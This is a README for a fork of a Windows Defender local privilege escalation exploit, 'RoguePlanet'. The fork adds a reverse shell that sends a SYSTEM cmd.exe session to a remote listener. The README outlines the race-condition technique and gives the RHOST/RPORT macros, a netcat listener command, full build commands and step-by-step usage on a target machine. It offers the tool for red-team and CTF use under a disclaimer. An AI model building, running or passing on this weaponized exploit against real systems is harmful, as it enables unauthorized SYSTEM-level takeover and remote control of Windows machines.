# RoguePlanet Fork

This repository is a fork of the original RoguePlanet PoC by **Nightmare Eclipse (Dead eclipse)**.
The original research targets a local privilege escalation vulnerability in Microsoft Windows Defender.

This fork adds an optional reverse-shell payload for red-team lab and CTF use.

---

## Overview

RoguePlanet abuses the scan/quarantine lifecycle of Windows Defender through a series of race-condition primitives:

- Mount-point junctions (`FSCTL_SET_REPARSE_POINT`)
- Opportunistic locks (`FSCTL_REQUEST_OPLOCK`)
- Volume Shadow Copy manipulation
- Public `MpClient.dll` API calls (`MpScanStart`, `MpCleanStart`)
- Windows Error Reporting scheduled task (`QueueReporting`)

If the race succeeds, the payload runs as `NT AUTHORITY\SYSTEM`.

## Reverse Shell

This fork adds an optional reverse-shell payload for CTF testing. When the exploit elevates to `SYSTEM`, it spawns a background thread that connects back to a listener and launches `cmd.exe` over the socket.

Edit these macros at the top of `RoguePlanet.cpp` before building:

```cpp
#define ROGUEPLANET_ENABLE_REVERSE_SHELL 1
#define ROGUEPLANET_RHOST "127.0.0.1"
#define ROGUEPLANET_RPORT 4444
```

Set `ROGUEPLANET_ENABLE_REVERSE_SHELL` to `0` to keep only the interactive SYSTEM `conhost` behavior.

### Listener Example

```bash
nc -lvnp 4444
```

## Build

### Visual Studio (Windows)

Open a Developer Command Prompt and run:

```cmd
cl.exe /EHsc /O2 /Fe:RoguePlanet.exe RoguePlanet.cpp
```

Or build from the Visual Studio IDE by creating a new empty C++ project, adding `RoguePlanet.cpp`, and linking against:

- `kernel32.lib`
- `ntdll.lib`
- `Rpcrt4.lib`
- `shlwapi.lib`
- `virtdisk.lib`
- `taskschd.lib`
- `comsupp.lib`
- `bcrypt.lib`
- `ws2_32.lib`

### Cross-compile (MinGW-w64)

```bash
x86_64-w64-mingw32-g++ -O2 -o RoguePlanet.exe RoguePlanet.cpp -lkernel32 -lntdll -lrpcrt4 -lshlwapi -lvirtdisk -ltaskschd -lcomsupp -lbcrypt -lws2_32
```

## Usage

1. Start a listener on the attacker machine:

```bash
nc -lvnp 4444
```

2. Run `RoguePlanet.exe` as a low-privileged user on the target.

3. If the race succeeds, a SYSTEM `cmd.exe` session is sent to the listener.

## Notes

- The exploit relies on a race condition; success is not guaranteed on every run.
- Windows Server is not supported by this PoC because standard users cannot mount ISO images by default. The underlying vulnerability is believed to affect Windows Server as well.
- The May 2026 Microsoft update hardened `mpengine!SysIO*`, which forced a redesign of the exploit path. Full RCE from this LPE primitive is currently considered unreliable.

## Security Notice

This tool is intended for:

- CTF and lab exercises.
- Authorized penetration testing with written permission.
- Security research and defense-hardening activities.

Do not use on systems you do not own or have explicit permission to test.

## License

Use at your own risk. The author is not responsible for unauthorized or illegal use.

## Attribution

Original vulnerability research and PoC files by **Nightmare Eclipse (Dead eclipse)**. This reverse-shell fork was created for red-team lab / CTF use.
